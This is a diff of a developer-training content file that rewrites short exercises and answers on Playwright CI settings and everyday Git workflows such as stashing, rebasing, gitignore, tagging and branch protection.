+});`,
+              answer: `Retry in CI only, and keep traces only for failures to save time.`,
+              solution: `export default defineConfig({
+  retries: process.env.CI ? 2 : 0,
+  use: { trace: 'on-first-retry' },
+});`,
             },
             {
-              task: `Join test reports from all machines into one.`,
-              description: `Checks sharded CI. Describe merging blob reports in GitHub Actions.`,
-              answer: `Each shard uploads blob-report as an artifact; a final job downloads all with pattern and merge-multiple, then runs npx playwright merge-reports --reporter html ./all-blob-reports and uploads the HTML report.`,
+              task: `Block test.only from reaching CI.`,
+              description: `Checks forbidOnly.`,
+              answer: `forbidOnly fails the run if someone left test.only.`,
+              solution: `forbidOnly: !!process.env.CI,`,
             },
           ],
         },
@@ -1240,14 +1412,15 @@ export default defineConfig({
           ai: true,
           exercises: [
             {
-              task: `Pick five main end to end tests for an admissions app.`,
-              description: `Checks prioritization.`,
-              answer: `Login, search and open an applicant, update an application status, submit/export a report, and an admin settings change. These cover the most-used and highest-impact flows.`,
+              task: `Name the first tests to add.`,
+              description: `Checks risk-based test priorities.`,
+              code: `// No tests, bugs after every release`,
+              answer: `A few e2e smoke tests for the top user flows, plus a test for each bug as it is fixed.`,
             },
             {
-              task: `How do you test a big old function before you change it?`,
-              description: `Checks characterization testing for an untested 400-line function.`,
-              answer: `Call it with many representative inputs and snapshot or record the current outputs (even if they seem wrong). The tests lock in existing behavior so a refactor can be verified; real bugs are fixed in separate commits.`,
+              task: `Name a metric to show progress.`,
+              description: `Checks measuring test impact.`,
+              answer: `Bugs found after release per month. It should go down as tests grow.`,
             },
           ],
         },
@@ -1262,14 +1435,18 @@ export default defineConfig({
           long: `fetch updates remote-tracking refs like origin/main.\nYou can inspect with git log main..origin/main before integrating.\npull = fetch + merge by default; pull --rebase replays local commits on top.\nSet git config pull.rebase true (or ff only) to avoid accidental merge commits.\nfetch is always safe; pull can create conflicts.\nUse git fetch --prune to remove deleted remote branches.`,
           exercises: [
             {
-              task: `See new commits from the team before you merge them.`,
-              description: `Checks safe workflow. Show the commands.`,
-              answer: `git fetch origin, then git log --oneline main..origin/main to list incoming commits and git diff main origin/main to view changes. Integrate afterwards with git merge or git rebase.`,
+              task: `Name what each command does.`,
+              description: `Checks fetch versus pull.`,
+              code: `git fetch origin
+git pull origin main`,
+              answer: `fetch downloads remote changes only; pull fetches and then merges or rebases into your branch.`,
             },
             {
-              task: `Set git pull to fast forward only.`,
-              description: `Checks config; run git config --global pull.ff only.`,
-              answer: `With pull.ff only, git pull fails instead of creating a merge commit when histories diverged. You then decide explicitly whether to rebase or merge, keeping history clean.`,
+              task: `See incoming commits before merging.`,
+              description: `Checks inspecting fetched changes.`,
+              answer: `Fetch, then compare your branch to the remote.`,
+              solution: `git fetch
+git log --oneline HEAD..origin/main`,
             },
           ],
         },
@@ -1289,14 +1466,18 @@ git commit -m "Stop tracking .env"
 # If pushed: git filter-repo --path .env --invert-paths && git push --force-with-lease`,
           exercises: [
             {
-              task: `Check your changes before you commit.`,
-              description: `Checks habits. Show commands to review changes.`,
-              answer: `git status to see files, git diff --staged to review the exact staged content, and git add -p to stage hunks selectively. This catches stray files and debug code before they are committed.`,
+              task: `Stop tracking the env file.`,
+              description: `Checks git rm --cached.`,
+              code: `# .env is already committed`,
+              answer: `Remove it from the index, keep the file locally, and ignore it.`,
+              solution: `git rm --cached .env
+echo .env >> .gitignore
+git commit -m "Stop tracking .env"`,
             },
             {
-              task: `Scan for secrets before each commit.`,
-              description: `Checks prevention. Configure gitleaks as a pre-commit hook.`,
-              answer: `Install gitleaks and add a pre-commit hook (via husky or pre-commit framework) running gitleaks protect --staged. The commit is blocked when a secret pattern is detected.`,
+              task: `Name the most important step after a leak.`,
+              description: `Checks rotating secrets.`,
+              answer: `Rotate the secret at once. It stays in history and clones, so deleting the file is not enough.`,
             },
           ],
         },
@@ -1306,14 +1487,16 @@ git commit -m "Stop tracking .env"
           long: `Summary in imperative mood: "Fix date parsing in report filter".\nBody explains why and any side effects; the diff shows what.\nReference the ticket (e.g. [OUT-123]) per team convention.\nConventional Commits (feat:, fix:) enable automated changelogs.\nOne logical change per commit; do not mix refactors with fixes.\nSmall commits make git revert and git bisect precise.`,
           exercises: [
             {
-              task: `Rewrite these bad commit messages.`,
-              description: `Checks message quality. Improve: "fix", "changes", "WIP stuff".`,
-              answer: `Examples: "Fix crash when applicant has no email", "Rename UserCard props for clarity", "Add pagination to applicants table". Each states the change and could stand alone in a changelog.`,
+              task: `Improve this commit message.`,
+              description: `Checks clear commit messages.`,
+              code: `git commit -m "fix"`,
+              answer: `Say what changed and why, in the imperative mood.`,
+              solution: `git commit -m "Fix crash when cart is empty"`,
             },
             {
-              task: `Split one file change into two commits.`,
-              description: `Checks git add -p. You changed formatting and logic in the same file.`,
-              answer: `Use git add -p to stage only the logic hunks and commit, then stage the rest and commit as formatting. Reviewers can then read the logic change without formatting noise.`,
+              task: `Name a reason for small commits.`,
+              description: `Checks commit size benefits.`,
+              answer: `They are easy to review, revert, and find with git bisect.`,
             },
           ],
         },
@@ -1325,14 +1508,22 @@ git commit -m "Stop tracking .env"
           long: `pick keeps a commit; reword edits the message; squash/fixup merge into the previous commit; drop removes it.\ngit commit --fixup=<sha> then git rebase -i --autosquash origin/main places fixups automatically.\nAfter rewriting, push with --force-with-lease, which refuses if the remote moved.\nNever rewrite shared branches like main.\nIf something goes wrong: git rebase --abort, or git reflog to recover.\nSome teams squash-merge PRs instead, making this less necessary.`,
           exercises: [
             {
-              task: `Fix a typo in an older commit on your branch.`,
-              description: `Checks fixup workflow for commit abc123.`,
-              answer: `Edit the file, git commit --fixup=abc123, then git rebase -i --autosquash origin/main (or set rebase.autoSquash true). The fix is folded into abc123 and history reads as if it was right originally.`,
+              task: `Squash fixup commits into one.`,
+              description: `Checks interactive rebase actions.`,
+              code: `pick a1 Add search
+pick b2 fix typo
+pick c3 fix lint`,
+              answer: `Change the later lines to fixup, so they join the first commit.`,
+              solution: `pick a1 Add search
+fixup b2 fix typo
+fixup c3 fix lint`,
             },
             {
-              task: `What is the difference between force and force with lease?`,
-              description: `Checks safe pushing.`,
-              answer: `--force overwrites the remote branch unconditionally, potentially deleting a teammate's pushed commits. --force-with-lease only overwrites if the remote still points to what you last fetched, otherwise it refuses.`,
+              task: `Write a fixup commit for an older commit.`,
+              description: `Checks --fixup with autosquash.`,
+              answer: `Create a fixup commit, then autosquash it.`,
+              solution: `git commit --fixup=a1
+git rebase -i --autosquash main`,
             },
           ],
         },
@@ -1354,14 +1545,23 @@ git rm -r --cached node_modules dist
 git commit -m "Stop tracking build output and dependencies"`,
           exercises: [
             {
-              task: `Find out why a nested node modules folder is not ignored.`,
-              description: `Checks check-ignore for packages/app/node_modules.`,
-              answer: `Run git check-ignore -v packages/app/node_modules/x; no output means no rule matches. The /node_modules rule only matches the root, so change it to node_modules/ to match any depth.`,
+              task: `Fix the gitignore.`,
+              description: `Checks ignoring already tracked files.`,
+              code: `# .gitignore
+node_modules/
+dist/
+# but dist is still tracked`,
+              answer: `gitignore does not affect tracked files. Remove them from the index.`,
+              solution: `git rm -r --cached dist node_modules
+git commit -m "Untrack build output"`,
             },
             {
-              task: `Ignore Mac system files in all your repos.`,
-              description: `Checks global config for .DS_Store.`,
-              answer: `Create ~/.gitignore_global with .DS_Store and run git config --global core.excludesFile ~/.gitignore_global. Personal OS/editor files stay out of every repo without polluting shared config.`,
+              task: `Predict which files are ignored.`,
+              description: `Checks gitignore patterns.`,
+              code: `/dist
+*.log
+!keep.log`,
+              answer: `Root dist folder and all .log files, except keep.log, which ! includes again.`,
             },
           ],
         },
@@ -1371,14 +1571,20 @@ git commit -m "Stop tracking build output and dependencies"`,
           long: `git stash push -m "msg" saves changes; git stash pop reapplies and drops; apply keeps it.\n-u includes untracked files; git stash list/show to inspect.\nStashes are easy to forget; prefer a WIP commit for long-lived work.\ngit cherry-pick <sha> creates a new commit with the same change (different SHA).\n-x adds "cherry picked from" to the message for traceability.\nOveruse causes duplicate commits and conflicts; prefer merging when possible.`,
           exercises: [
             {
-              task: `Copy a fix from main to a release branch.`,
-              description: `Checks cherry-pick of commit f00d to release/2.3.`,
-              answer: `git switch release/2.3, git cherry-pick -x f00d, resolve conflicts if any, run tests and push. The -x note links the backport to the original commit.`,
+              task: `Save work and switch branches.`,
+              description: `Checks git stash.`,
+              code: `# Half-done work; urgent hotfix needed`,
+              answer: `Stash saves uncommitted changes, including new files with -u.`,
+              solution: `git stash push -u -m "wip search"
+git switch hotfix
+# later: git stash pop`,
             },
             {
-              task: `Save new files too before you switch branch.`,
-              description: `Checks stash options with untracked files.`,
-              answer: `git stash push -u -m "wip feature" stashes tracked and untracked changes. After returning, git stash pop restores them; check git stash list if you have several.`,
+              task: `Copy one fix to the release branch.`,
+              description: `Checks cherry-pick.`,
+              answer: `cherry-pick applies one commit on top of the current branch.`,
+              solution: `git switch release
+git cherry-pick a1b2c3d`,
             },
           ],
         },
@@ -1390,14 +1596,19 @@ git commit -m "Stop tracking build output and dependencies"`,
           long: `git worktree add ../hotfix hotfix-branch: separate directory, shared object store, no stash juggling.\nGreat for reviewing a PR while keeping your work open, or running agents in parallel.\nSparse checkout (git sparse-checkout set apps/web packages/ui) shrinks working tree in monorepos.\nPartial clone --filter=blob:none fetches history but blobs lazily; --filter=tree:0 even lighter.\nShallow clones (--depth=1) are good for CI but break merge-base/bisect.\nScalar (bundled with git) configures these for huge repos.`,
           exercises: [
             {
-              task: `Review a pull request in a second folder with worktree.`,
-              description: `Checks worktrees for branch feature/x.`,
-              answer: `git fetch origin feature/x, git worktree add ../review-x origin/feature/x, work there, then git worktree remove ../review-x. Your main checkout is untouched.`,
+              task: `Open a second branch without stashing.`,
+              description: `Checks git worktree.`,
+              code: `# Review a hotfix while main work is mid-change`,
+              answer: `A worktree checks out another branch in a new folder.`,
+              solution: `git worktree add ../hotfix hotfix
+cd ../hotfix`,
             },
             {
-              task: `Clone only the web app folder of a huge repository.`,
-              description: `Checks partial plus sparse clone for apps/web.`,
-              answer: `git clone --filter=blob:none --sparse <url>, then git sparse-checkout set apps/web packages/shared. Only needed blobs download, cutting clone time and disk usage drastically.`,
+              task: `Clone only one folder of a big repo.`,
+              description: `Checks partial clone and sparse checkout.`,
+              answer: `Partial clone skips blobs; sparse checkout limits files.`,
+              solution: `git clone --filter=blob:none --sparse <url>
+git sparse-checkout set apps/web`,
             },
           ],
         },
@@ -1421,14 +1632,16 @@ git diff                   # always review before committing`,
           follow: `Why are long-lived branches a problem even with rerere?`,
           exercises: [
             {
-              task: `rerere applied a wrong fix. How do you undo it for one file?`,
-              description: `Checks recovery.`,
-              answer: `Run git rerere forget <file> to drop the saved resolution, then git checkout -m <file> to restore the conflict and fix it again.`,
+              task: `Turn on reuse of conflict fixes.`,
+              description: `Checks git rerere.`,
+              code: `# Same conflict on every rebase of a long branch`,
+              answer: `rerere records conflict resolutions and replays them later.`,
+              solution: `git config --global rerere.enabled true`,
             },
             {
-              task: `What process change avoids most of these conflicts?`,
-              description: `Checks the root cause.`,
-              answer: `Keep branches short-lived, merge small slices behind feature flags, and update from main every day.`,
+              task: `Name a way to avoid repeated conflicts.`,
+              description: `Checks branch hygiene.`,
+              answer: `Merge main into the branch often or keep branches short-lived, so conflicts stay small.`,
             },
           ],
         },
@@ -1439,14 +1652,16 @@ git diff                   # always review before committing`,
           ai: true,
           exercises: [
             {
-              task: `Run lint and format only on staged files before commit.`,
-              description: `Checks husky + lint-staged setup for TS files.`,
-              answer: `npx husky init, write npx lint-staged into .husky/pre-commit, and in package.json add "lint-staged": { "*.{ts,tsx}": ["eslint --fix", "prettier --write"] }. Only staged files are processed, keeping commits fast.`,
+              task: `Write a commit-msg check with commitlint.`,
+              description: `Checks enforcing commit format.`,
+              answer: `A commit-msg hook runs commitlint on every message.`,
+              solution: `# .husky/commit-msg
+npx --no -- commitlint --edit "$1"`,
             },
             {
-              task: `Require a ticket key at the start of each commit message.`,
-              description: `Checks commit-msg hook for [OUT-123] prefix.`,
-              answer: `Add a commit-msg hook that tests the first line against /^\\[OUT-\\d+\\] .+/ and exits 1 otherwise. Mirror the same check in CI (e.g. on PR title or commits) since hooks are bypassable.`,
+              task: `Name why client hooks are not enough.`,
+              description: `Checks server-side enforcement.`,
+              answer: `Developers can skip them with --no-verify. Enforce rules with branch protection and CI checks on the server.`,
             },
           ],
         },
@@ -1464,16 +1679,17 @@ Strong answer: tags as release anchors, automation, and linking versions to moni
           follow: `Why should the version number be visible in error reports?`,
           exercises: [
             {
-              task: `Create an annotated tag for release 2.4.1 and push it.`,
-              description: `Checks the commands.`,
-              answer: `Use git tag -a with a message, then push the tag.`,
-              solution: `git tag -a v2.4.1 -m "Release 2.4.1"
-git push origin v2.4.1`,
+              task: `Pick the next version.`,
+              description: `Checks semantic versioning.`,
+              code: `# current 2.4.1; you removed a public prop`,
+              answer: `3.0.0. Removing a public API is a breaking change, so the major number goes up.`,
             },
             {
-              task: `Which version comes after 2.4.1 for: a bug fix, a new filter, removing an old API?`,
-              description: `Checks semver rules.`,
-              answer: `Bug fix: 2.4.2. New feature: 2.5.0. Breaking change: 3.0.0.`,
+              task: `Create and push a release tag.`,
+              description: `Checks annotated tags.`,
+              answer: `Annotated tags keep author and message.`,
+              solution: `git tag -a v2.5.0 -m "Release 2.5.0"
+git push origin v2.5.0`,
             },
           ],
         },
@@ -1489,14 +1705,17 @@ git push origin 9fceb02:main --force-with-lease=main:<current-bad-sha>
 # Then: Settings -> Rules -> Rulesets -> target main: block force pushes, restrict deletions, require PR`,
           exercises: [
             {
-              task: `Find the lost commit without a local copy.`,
-              description: `Checks GitHub tooling with gh api.`,
-              answer: `Use the repo Activity page or gh api repos/OWNER/REPO/activity?ref=refs/heads/main which lists pushes including force pushes with before and after SHAs. The before SHA is the commit to restore.`,
+              task: `Get the lost commits back.`,
+              description: `Checks recovering from a force push.`,
+              code: `# main was force-pushed; your local main is old`,
+              answer: `A clone that has the old commits can restore them. Find the old tip in reflog and push it back.`,
+              solution: `git reflog show origin/main
+git push origin <old-sha>:main --force-with-lease`,
             },
             {
-              task: `List the protection rules for the main branch.`,
-              description: `Checks protection design.`,
-              answer: `Require pull request with 1+ approvals and CODEOWNERS review, required status checks, block force pushes, restrict deletions, require linear history and limit bypass to an emergency admin group with audit.`,
+              task: `Name a setting to stop force pushes.`,
+              description: `Checks branch protection.`,
+              answer: `Branch protection or rulesets on main that block force pushes and deletions for everyone.`,
             },
           ],
         },
@@ -1507,17 +1726,15 @@ git push origin 9fceb02:main --force-with-lease=main:<current-bad-sha>
           ai: true,
           exercises: [
             {
-              task: `Write a pull request template.`,
-              description: `Checks practical artifacts. Draft sections for .github/pull_request_template.md.`,
-              answer: `Summary (what and why), linked ticket, screenshots for UI, testing done, risk/rollback notes and a checklist (tests added, a11y checked, no secrets). It nudges consistency without manual policing.`,
+              task: `Name a way to teach Git rules at scale.`,
+              description: `Checks enablement over policing.`,
+              answer: `A short written guide with examples, plus automation: PR templates, commitlint, and branch rules that give quick feedback.`,
             },
             {
-              task: `Check branch names in CI.`,
-              description: `Checks automation. Fail when the head branch doesn't match feature/OUT-123-desc or bugfix/OUT-123-desc.`,
-              answer: `In a pull_request workflow, pass github.head_ref via env and test it with a regex like ^(feature|bugfix)/OUT-[0-9]+-[a-z0-9-]+$ using grep -E, exiting 1 on mismatch. Using env avoids script injection from branch names.`,
-              solution: `- env:
-    BRANCH: \${{ github.head_ref }}
-  run: echo "$BRANCH" | grep -Eq '^(feature|bugfix)/OUT-[0-9]+-[a-z0-9-]+$'`,
+              task: `Respond to this situation.`,
+              description: `Checks coaching instead of micromanaging.`,
+              code: `// A new dev keeps pushing huge commits.`,
+              answer: `Pair with them once on splitting commits, link the guide, and let review comments, not policing, reinforce it.`,
             },
           ],
         },
